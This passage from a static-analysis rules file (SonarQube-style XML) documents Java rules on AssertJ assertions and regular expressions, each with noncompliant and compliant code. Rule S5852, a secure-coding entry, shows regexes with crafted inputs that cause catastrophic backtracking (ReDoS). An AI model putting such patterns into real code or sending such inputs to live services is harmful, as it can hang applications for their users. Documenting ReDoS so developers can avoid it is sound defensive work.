            &lt;/tbody&gt;
            &lt;/table&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(getObject()).isEqualTo(null); // Noncompliant
            assertThat(getObject()).isNotEqualTo(null); // Noncompliant - not listed above but also supported

            assertThat(getString().trim()).isEmpty();
            assertThat(getFile().canRead()).isTrue();
            assertThat(getPath().getParent()).isNull();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(getObject()).isNull();

            assertThat(getString()).isBlank();
            assertThat(getFile()).canRead();
            assertThat(getPath()).hasNoParentRaw();
            &lt;/pre&gt;
        </description>
        <tag>assertj</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5841' priority='MINOR'>
        <configKey>S5841</configKey>
        <name>AssertJ assertions &quot;allMatch&quot; and &quot;doesNotContains&quot; should also test for emptiness
        </name>
        <description>
            &lt;p&gt;AssertJ assertions &lt;code&gt;allMatch&lt;/code&gt; and &lt;code&gt;doesNotContains&lt;/code&gt;
            on an empty list always&amp;nbsp;returns true whatever the content of the
            predicate. Despite being correct, you should make explicit if you expect an empty list or not, by adding
            &lt;code&gt;isEmpty()&lt;/code&gt;/&lt;code&gt;isNotEmpty()&lt;/code&gt; in addition to calling the
            assertion, or by testing the list's content further. It will justify the
            useless predicate to improve clarity or increase the reliability of the test.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when any of the methods listed are used without asserting that the list
            is empty or not and without testing the
            content.&lt;/p&gt;
            &lt;p&gt;Targetted methods:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;allMatch&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;allSatisfy&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;doesNotContain&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;doesNotContainSequence&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;doesNotContainSubsequence&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;doesNotContainAnyElementsOf&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;String&amp;gt; logs = getLogs();

            assertThat(logs).allMatch(e -&amp;gt; e.contains(“error”)); // Noncompliant, this test pass if logs are
            empty!
            assertThat(logs).doesNotContain(&quot;error&quot;); // Noncompliant, do you expect any log?
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;String&amp;gt; logs = getLogs();

            assertThat(logs).isNotEmpty().allMatch(e -&amp;gt; e.contains(“error”));
            // Or
            assertThat(logs).hasSize(5).allMatch(e -&amp;gt; e.contains(“error”));
            // Or
            assertThat(logs).isEmpty();

            // Despite being redundant, this is also acceptable since it explains why you expect an empty list
            assertThat(logs).doesNotContain(&quot;error&quot;).isEmpty();
            // or test the content of the list further
            assertThat(logs).contains(&quot;warning&quot;).doesNotContain(&quot;error&quot;);
            &lt;/pre&gt;
        </description>
        <tag>assertj</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5842' priority='MINOR'>
        <configKey>S5842</configKey>
        <name>Regex repetition pattern's body should not match the empty String</name>
        <description>
            &lt;p&gt;A regex should never include a repetitive pattern whose body would match the empty String. This is
            usually a sign that a part of the regex is
            redundant or does not do what the author intended.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &quot;(?:)*&quot; // same as the empty regex, the '*' accomplishes nothing
            &quot;(?:|x)*&quot; // same as the empty regex, the alternative has no effect
            &quot;(?:x|)*&quot; // same as 'x*', the empty alternative has no effect
            &quot;(?:x*|y*)*&quot; // same as 'x*', the first alternative would always match, y* is never tried
            &quot;(?:x?)*&quot; // same as 'x*'
            &quot;(?:x?)+&quot; // same as 'x*'
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &quot;x*&quot;
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5843' priority='MAJOR'>
        <configKey>S5843</configKey>
        <name>Regular expressions should not be too complicated</name>
        <description>
            &lt;p&gt;Overly complicated regular expressions are hard to read and to maintain and can easily cause
            hard-to-find bugs. If a regex is too complicated, you
            should consider replacing it or parts of it with regular code or splitting it apart into multiple patterns
            at least.&lt;/p&gt;
            &lt;p&gt;The complexity of a regular expression is determined as follows:&lt;/p&gt;
            &lt;p&gt;Each of the following operators increases the complexity by an amount equal to the current nesting
            level and also increases the current nesting
            level by one for its arguments:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;|&lt;/code&gt; - when multiple &lt;code&gt;|&lt;/code&gt; operators are used
            together, the subsequent ones only increase the complexity by 1 &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; (inside character classes) - when multiple &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;
            operators are used together, the subsequent ones
            only increase the complexity by 1 &lt;/li&gt;
            &lt;li&gt; Quantifiers (&lt;code&gt;*&lt;/code&gt;, &lt;code&gt;+&lt;/code&gt;, &lt;code&gt;?&lt;/code&gt;,
            &lt;code&gt;{n,m}&lt;/code&gt;, &lt;code&gt;{n,}&lt;/code&gt; or &lt;code&gt;{n}&lt;/code&gt;) &lt;/li&gt;
            &lt;li&gt; Non-capturing groups that set flags (such as &lt;code&gt;(?i:some_pattern)&lt;/code&gt; or &lt;code&gt;(?i)some_pattern&lt;/code&gt;)
            &lt;/li&gt;
            &lt;li&gt; Lookahead and lookbehind assertions &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Additionally, each use of the following features increase the complexity by 1 regardless of
            nesting:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; character classes &lt;/li&gt;
            &lt;li&gt; back references &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;If a regular expression is split among multiple variables, the complexity is calculated for each
            variable individually, not for the whole regular
            expression. If a regular expression is split over multiple lines, each line is treated individually if it is
            accompanied by a comment (either a Java
            comment or a comment within the regular expression), otherwise the regular expression is analyzed as a
            whole.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (dateString.matches(&quot;^(?:(?:31(\\/|-|\\.)(?:0?[13578]|1[02]))\\1|(?:(?:29|30)(\\/|-|\\.)(?:0?[13-9]|1[0-2])\\2))(?:(?:1[6-9]|[2-9]\\d)?\\d{2})$|^(?:29(\\/|-|\\.)0?2\\3(?:(?:(?:1[6-9]|[2-9]\\d)?(?:0[48]|[2468][048]|[13579][26])|(?:(?:16|[2468][048]|[3579][26])00))))$|^(?:0?[1-9]|1\\d|2[0-8])(\\/|-|\\.)(?:(?:0?[1-9])|(?:1[0-2]))\\4(?:(?:1[6-9]|[2-9]\\d)?\\d{2})$&quot;))
            {
            handleDate(dateString);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (dateString.matches(&quot;^\\d{1,2}([-/.])\\d{1,2}\\1\\d{1,4}$&quot;)) {
            String dateParts[] = dateString.split(&quot;[-/.]&quot;);
            int day = Integer.parseInt(dateParts[0]);
            int month = Integer.parseInt(dateParts[1]);
            int year = Integer.parseInt(dateParts[2]);
            // Put logic to validate and process the date based on its integer parts here
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Regular expressions are only analyzed if all parts of the regular expression are either string
            literals, effectively final local variables or
            &lt;code&gt;static final&lt;/code&gt; fields, all of which can be combined using the '&lt;code&gt;+&lt;/code&gt;'
            operator.&lt;/p&gt;
            &lt;p&gt;When a regular expression is split among multiple variables or commented lines, each part is only
            analyzed if it is syntactically valid by
            itself.&lt;/p&gt;
        </description>
        <tag>regex</tag>
        <param>
            <key>maxComplexity</key>
            <htmlDesc>The maximum authorized complexity.</htmlDesc>
            <defaultValue>20</defaultValue>
            <type>INTEGER</type>
        </param>
    </rule>

    <rule key='S5845' priority='CRITICAL'>
        <configKey>S5845</configKey>
        <name>Assertions comparing incompatible types should not be made</name>
        <description>
            &lt;p&gt;Assertions comparing incompatible types always fail, and negative assertions always pass. At best,
            negative assertions are useless. At worst, the
            developer loses time trying to fix his code logic before noticing wrong assertions.&lt;/p&gt;
            &lt;p&gt;Dissimilar types are:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; comparing a primitive with null &lt;/li&gt;
            &lt;li&gt; comparing an object with an unrelated primitive (E.G. a string with an int) &lt;/li&gt;
            &lt;li&gt; comparing unrelated classes &lt;/li&gt;
            &lt;li&gt; comparing an array to a non-array &lt;/li&gt;
            &lt;li&gt; comparing two arrays of dissimilar types &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;This rule also raises issues for unrelated &lt;code&gt;class&lt;/code&gt; and &lt;code&gt;interface&lt;/code&gt;
            or unrelated &lt;code&gt;interface&lt;/code&gt; types in negative
            assertions. Because except in some corner cases, those types are more likely to be dissimilar. And inside a
            negative assertion, there is no test
            failure to inform the developer about this unusual comparison.&lt;/p&gt;
            &lt;p&gt;Supported test frameworks:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit4 &lt;/li&gt;
            &lt;li&gt; JUnit5 &lt;/li&gt;
            &lt;li&gt; AssertJ &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            interface KitchenTool {}
            interface Plant {}
            class Spatula implements KitchenTool {}
            class Tree implements Plant {}

            void assertValues(int size,
            Spatula spatula, KitchenTool tool, KitchenTool[] tools,
            Tree tree, Plant plant, Tree[] trees) {

            // Whatever the given values, those negative assertions will always pass due to dissimilar types:
            assertThat(size).isNotNull(); // Noncompliant; primitives can not be null
            assertThat(spatula).isNotEqualTo(tree); // Noncompliant; unrelated classes
            assertThat(tool).isNotSameAs(tools); // Noncompliant; array &amp;amp; non-array
            assertThat(trees).isNotEqualTo(tools); // Noncompliant; incompatible arrays

            // Those assertions will always fail
            assertThat(size).isNull(); // Noncompliant
            assertThat(spatula).isEqualTo(tree); // Noncompliant

            // Those negative assertions are more likely to always pass
            assertThat(spatula).isNotEqualTo(plant); // Noncompliant; unrelated class and interface
            assertThat(tool).isNotEqualTo(plant); // Noncompliant; unrelated interfaces
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS2159'&gt;S2159&lt;/a&gt; - Silly equality checks
            should not be made &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>tests</tag>
    </rule>

    <rule key='S5846' priority='CRITICAL'>
        <configKey>S5846</configKey>
        <name>Empty lines should not be tested with regex MULTILINE flag</name>
        <description>
            &lt;p&gt;One way to test for empty lines is to use the regex &lt;code&gt;&quot;^$&quot;&lt;/code&gt;, which
            can be extremely handy when filtering out empty lines from collections
            of Strings, for instance. With regard to this, the Javadoc for &lt;a
            href=&quot;https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/regex/Pattern.html&quot;&gt;Pattern
            (Line Terminators)&lt;/a&gt; states the
            following:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;By default, the regular expressions ^ and &lt;code&gt;$&lt;/code&gt; ignore line terminators and
            only match at the beginning and the end, respectively, of
            the entire input sequence. If &lt;code&gt;MULTILINE&lt;/code&gt; mode is activated then ^ matches at the
            beginning of input and after any line terminator
            &lt;strong&gt;except at the end of input&lt;/strong&gt;. When in &lt;code&gt;MULTILINE&lt;/code&gt; mode
            &lt;code&gt;$&lt;/code&gt; matches just before a line terminator or the end of
            the input sequence.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;As emphasized, ^ is not going to match at the end of an input, and the end of the input is
            necessarily included in the empty string, which might
            lead to completely missing empty lines, while it would be the initial reason for using such regex.&lt;/p&gt;
            &lt;p&gt;Therefore, when searching for empty lines using a multi-line regular expression, you should also
            check whether the string is empty.&lt;/p&gt;
            &lt;p&gt;This rule is raising an issue every time a pattern that can match the empty string is used with
            &lt;code&gt;MULTILINE&lt;/code&gt; flag and without calling
            &lt;code&gt;isEmpty()&lt;/code&gt; on the string.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            static final Pattern p = Pattern.compile(&quot;^$&quot;, Pattern.MULTILINE); // Noncompliant

            // Alternatively
            static final Pattern p = Pattern.compile(&quot;(?m)^$&quot;); // Noncompliant


            boolean containsEmptyLines(String str) {
            return p.matcher(str).find();
            }

            // ...
            System.out.println(containsEmptyLines(&quot;a\n\nb&quot;)); // correctly prints 'true'
            System.out.println(containsEmptyLines(&quot;&quot;)); // incorrectly prints 'false'
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            static final Pattern p = Pattern.compile(&quot;^$&quot;, Pattern.MULTILINE);

            boolean containsEmptyLines(String str) {
            return p.matcher(str).find() || str.isEmpty();
            }

            // ...
            System.out.println(containsEmptyLines(&quot;a\n\nb&quot;)); // correctly prints 'true'
            System.out.println(containsEmptyLines(&quot;&quot;)); // also correctly prints 'true'
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5850' priority='MAJOR'>
        <configKey>S5850</configKey>
        <name>Alternatives in regular expressions should be grouped when used with anchors</name>
        <description>
            &lt;p&gt;In regular expressions, anchors (&lt;code&gt;^&lt;/code&gt;, &lt;code&gt;$&lt;/code&gt;, &lt;code&gt;\A&lt;/code&gt;,
            &lt;code&gt;\Z&lt;/code&gt; and &lt;code&gt;\z&lt;/code&gt;) have higher precedence than
            the &lt;code&gt;|&lt;/code&gt; operator. So in a regular expression like &lt;code&gt;^alt1|alt2|alt3$&lt;/code&gt;,
            &lt;code&gt;alt1&lt;/code&gt; would be anchored to the beginning,
            &lt;code&gt;alt3&lt;/code&gt; to the end and &lt;code&gt;alt2&lt;/code&gt; wouldn't be anchored at all.
            Usually the intended behavior is that all alternatives are anchored at
            both ends. To achieve this, a non-capturing group should be used around the alternatives.&lt;/p&gt;
            &lt;p&gt;In cases where it is intended that the anchors only apply to one alternative each, adding
            (non-capturing) groups around the anchors and the parts
            that they apply to will make it explicit which parts are anchored and avoid readers misunderstanding the
            precedence or changing it because they
            mistakenly assume the precedence was not intended.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            ^a|b|c$
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            ^(?:a|b|c)$
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            ^a$|^b$|^c$
            &lt;/pre&gt;
            &lt;p&gt;or, if you do want the anchors to only apply to &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;c&lt;/code&gt;
            respectively:&lt;/p&gt;
            &lt;pre&gt;
            (?:^a)|b|(?:c$)
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5852' priority='CRITICAL'>
        <configKey>S5852</configKey>
        <name>Using slow regular expressions is security-sensitive</name>
        <description>
            &lt;p&gt;Most of the regular expression engines use &lt;code&gt;backtracking&lt;/code&gt; to try all
            possible execution paths of the regular expression when evaluating
            an input, in some cases it can cause performance issues, called &lt;code&gt;catastrophic backtracking&lt;/code&gt;
            situations. In the worst case, the complexity
            of the regular expression is exponential in the size of the input, this means that a small carefully-crafted
            input (like 20 chars) can trigger
            &lt;code&gt;catastrophic backtracking&lt;/code&gt; and cause a denial of service of the application.
            Super-linear regex complexity can lead to the same impact too
            with, in this case, a large carefully-crafted input (thousands chars).&lt;/p&gt;
            &lt;p&gt;This rule determines the runtime complexity of a regular expression and informs you of the
            complexity if it is not linear.&lt;/p&gt;
            &lt;p&gt;Note that, due to improvements to the matching algorithm, some cases of exponential runtime
            complexity have become impossible when run using JDK 9
            or later. In such cases, an issue will only be reported if the project's target Java version is 8 or
            earlier.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The input is user-controlled. &lt;/li&gt;
            &lt;li&gt; The input size is not restricted to a small number of characters. &lt;/li&gt;
            &lt;li&gt; There is no timeout in place to limit the regex evaluation time. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;To avoid &lt;code&gt;catastrophic backtracking&lt;/code&gt; situations, make sure that none of the
            following conditions apply to your regular expression.&lt;/p&gt;
            &lt;p&gt;In all of the following cases, catastrophic backtracking can only happen if the problematic part of
            the regex is followed by a pattern that can
            fail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using &lt;code&gt;String.matches&lt;/code&gt;),
            the end of the
            regex counts as a pattern that can fail because it will only succeed when the end of the string is reached.&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; If you have a non-possessive repetition &lt;code&gt;r*&lt;/code&gt; or &lt;code&gt;r*?&lt;/code&gt;,
            such that the regex &lt;code&gt;r&lt;/code&gt; could produce different
            possible matches (of possibly different lengths) on the same input, the worst case matching time can be
            exponential. This can be the case if
            &lt;code&gt;r&lt;/code&gt; contains optional parts, alternations or additional repetitions (but not if the
            repetition is written in such a way that there's only
            one way to match it).
            &lt;ul&gt;
            &lt;li&gt; When using JDK 9 or later an optimization applies when the repetition is greedy and the entire
            regex does not contain any back references.
            In that case the runtime will only be polynomial (in case of nested repetitions) or even linear (in case of
            alternations or optional parts).
            &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;li&gt; If you have multiple non-possessive repetitions that can match the same contents and are
            consecutive or are only separated by an optional
            separator or a separator that can be matched by both of the repetitions, the worst case matching time can be
            polynomial (O(n^c) where c is the
            number of problematic repetitions). For example &lt;code&gt;a*b*&lt;/code&gt; is not a problem because &lt;code&gt;a*&lt;/code&gt;
            and &lt;code&gt;b*&lt;/code&gt; match different
            things and &lt;code&gt;a*_a*&lt;/code&gt; is not a problem because the repetitions are separated by a '_'
            and can't match that '_'. However, &lt;code&gt;a*a*&lt;/code&gt;
            and &lt;code&gt;.*_.*&lt;/code&gt; have quadratic runtime. &lt;/li&gt;
            &lt;li&gt; If you're performing a partial match (such as by using &lt;code&gt;Matcher.find&lt;/code&gt;,
            &lt;code&gt;String.split&lt;/code&gt;, &lt;code&gt;String.replaceAll&lt;/code&gt;
            etc.) and the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to
            avoid because whenever a match fails,
            the regex engine will try again starting at the next index. This means that any unbounded repetition (even a
            possessive one), if it's followed by a
            pattern that can fail, can cause quadratic runtime on some inputs. For example &lt;code&gt;str.split(&quot;\\s*,&quot;)&lt;/code&gt;
            will run in quadratic time on strings
            that consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma).
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;In order to rewrite your regular expression without these patterns, consider the following
            strategies:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; If applicable, define a maximum number of expected repetitions using the bounded quantifiers,
            like &lt;code&gt;{1,5}&lt;/code&gt; instead of &lt;code&gt;+&lt;/code&gt;
            for instance. &lt;/li&gt;
            &lt;li&gt; Refactor &lt;code&gt;nested quantifiers&lt;/code&gt; to limit the number of way the inner group
            can be matched by the outer quantifier, for instance this
            nested quantifier situation &lt;code&gt;(ba+)+&lt;/code&gt; doesn't cause performance issues, indeed, the
            inner group can be matched only if there exists
            exactly one &lt;code&gt;b&lt;/code&gt; char per repetition of the group. &lt;/li&gt;
            &lt;li&gt; Optimize regular expressions with &lt;code&gt;possessive quantifiers&lt;/code&gt; and &lt;code&gt;atomic
            grouping&lt;/code&gt;. &lt;/li&gt;
            &lt;li&gt; Use negated character classes instead of &lt;code&gt;.&lt;/code&gt; to exclude separators where
            applicable. For example the quadratic regex
            &lt;code&gt;.*_.*&lt;/code&gt; can be made linear by changing it to &lt;code&gt;[^_]*_.*&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Sometimes it's not possible to rewrite the regex to be linear while still matching what you want it
            to match. Especially when using partial
            matches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following
            approaches:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Solve the problem without regular expressions &lt;/li&gt;
            &lt;li&gt; Use an alternative non-backtracking regex implementations such as Google's &lt;a href=&quot;https://github.com/google/re2&quot;&gt;RE2&lt;/a&gt;
            or &lt;a
            href=&quot;https://github.com/google/re2j&quot;&gt;RE2/J&lt;/a&gt;. &lt;/li&gt;
            &lt;li&gt; Use multiple passes. This could mean pre- and/or post-processing the string manually before/after
            applying the regular expression to it or
            using multiple regular expressions. One example of this would be to replace &lt;code&gt;str.split(&quot;\\s*,\\s*&quot;)&lt;/code&gt;
            with &lt;code&gt;str.split(&quot;,&quot;)&lt;/code&gt; and
            then trimming the spaces from the strings as a second step. &lt;/li&gt;
            &lt;li&gt; When using &lt;code&gt;Matcher.find()&lt;/code&gt;, it is often possible to make the regex
            infallible by making all the parts that could fail optional,
            which will prevent backtracking. Of course this means that you'll accept more strings than intended, but
            this can be handled by using capturing
            groups to check whether the optional parts were matched or not and then ignoring the match if they weren't.
            For example the regex &lt;code&gt;x*y&lt;/code&gt;
            could be replaced with &lt;code&gt;x*(y)?&lt;/code&gt; and then the call to &lt;code&gt;matcher.find()&lt;/code&gt;
            could be replaced with &lt;code&gt;matcher.find() &amp;amp;&amp;amp;
            matcher.group(1) != null&lt;/code&gt;. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;The first regex evaluation will never end in &lt;code&gt;JDK&lt;/code&gt; &amp;lt;= 9 and the
            second regex evaluation will never end in any versions of the
            &lt;code&gt;JDK&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            java.util.regex.Pattern.compile(&quot;(a+)+&quot;).matcher(
            &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;+
            &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;+
            &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;+
            &quot;aaaaaaaaaaaaaaa!&quot;).matches(); // Sensitive

            java.util.regex.Pattern.compile(&quot;(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*&quot;).matcher(
            &quot;hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi&quot;+
            &quot;cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi&quot;+
            &quot;chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch&quot;+
            &quot;chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh&quot;+
            &quot;ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih&quot;+
            &quot;iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci&quot;).matches(); // Sensitive
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid
            performance issues:&lt;/p&gt;
            &lt;pre&gt;
            java.util.regex.Pattern.compile(&quot;(a+)++&quot;).matcher(
            &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;+
            &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;+
            &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;+
            &quot;aaaaaaaaaaaaaaa!&quot;).matches(); // Compliant

            java.util.regex.Pattern.compile(&quot;(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*+&quot;).matcher(
            &quot;hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi&quot;+
            &quot;cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi&quot;+
            &quot;chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch&quot;+
            &quot;chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh&quot;+
            &quot;ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih&quot;+
            &quot;iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci&quot;).matches(); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A1-Injection&quot;&gt;OWASP Top 10
            2017 Category A1&lt;/a&gt; - Injection &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/400.html&quot;&gt;MITRE, CWE-400&lt;/a&gt;
            - Uncontrolled Resource Consumption &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS&quot;&gt;owasp.org&lt;/a&gt;
            - OWASP Regular expression Denial
            of Service - ReDoS &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016&quot;&gt;stackstatus.net&lt;/a&gt;
            - Outage Postmortem - July 20, 2016
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.regular-expressions.info/catastrophic.html&quot;&gt;regular-expressions.info&lt;/a&gt;
            - Runaway Regular Expressions: Catastrophic
            Backtracking &lt;/li&gt;
            &lt;li&gt; &lt;a
            href=&quot;https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers&quot;&gt;docs.microsoft.com&lt;/a&gt;
            - Backtracking with Nested Optional Quantifiers &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a1</tag>
        <tag>regex</tag>
        <securityStandards>
            <OWASP>A1</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5853' priority='MINOR'>
        <configKey>S5853</configKey>
        <name>Consecutive AssertJ &quot;assertThat&quot; statements should be chained</name>
        <description>
            &lt;p&gt;AssertJ assertions methods targeting the same object can be chained instead of using multiple &lt;code&gt;assertThat&lt;/code&gt;.
            It avoids duplication and
            increases the clarity of the code.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when multiples &lt;code&gt;assertThat&lt;/code&gt; target the same tested
            value.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(someList).hasSize(3);
            assertThat(someList).contains(&quot;something&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(someList)
            .hasSize(3)
            .contains(&quot;something&quot;);
            &lt;/pre&gt;
        </description>
        <tag>assertj</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5854' priority='MAJOR'>
        <configKey>S5854</configKey>
        <name>Regexes containing characters subject to normalization should use the CANON_EQ flag</name>
        <description>
            &lt;p&gt;Characters like &lt;code&gt;'é'&lt;/code&gt; can be expressed either as a single code point or as
            a cluster of the letter &lt;code&gt;'e'&lt;/code&gt; and a combining
            accent mark. Without the &lt;code&gt;CANON_EQ&lt;/code&gt; flag, a regex will only match a string in which
            the characters are expressed in the same way.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String s = &quot;e\u0300&quot;;
            Pattern p = Pattern.compile(&quot;é|ë|è&quot;); // Noncompliant
            System.out.println(p.matcher(s).replaceAll(&quot;e&quot;)); // print 'é'
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String s = &quot;e\u0300&quot;;
            Pattern p = Pattern.compile(&quot;é|ë|è&quot;, Pattern.CANON_EQ);
            System.out.println(p.matcher(s).replaceAll(&quot;e&quot;)); // print 'e'
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5855' priority='MAJOR'>
        <configKey>S5855</configKey>
        <name>Regex alternatives should not be redundant</name>
        <description>
            &lt;p&gt;If an alternative in a regular expression only matches things that are already matched by another
            alternative, that alternative is redundant and
            serves no purpose.&lt;/p&gt;
            &lt;p&gt;In the best case this means that the offending subpattern is merely redundant and should be
            removed. In the worst case it's a sign that this regex
            does not match what it was intended to match and should be reworked.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &quot;[ab]|a&quot; // The &quot;|a&quot; is redundant because &quot;[ab]&quot; already matches &quot;a&quot;
            &quot;.*|a&quot; // .* matches everything, so any other alternative is redundant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &quot;[ab]&quot;
            &quot;.*&quot;
            &lt;/pre&gt;
        </description>
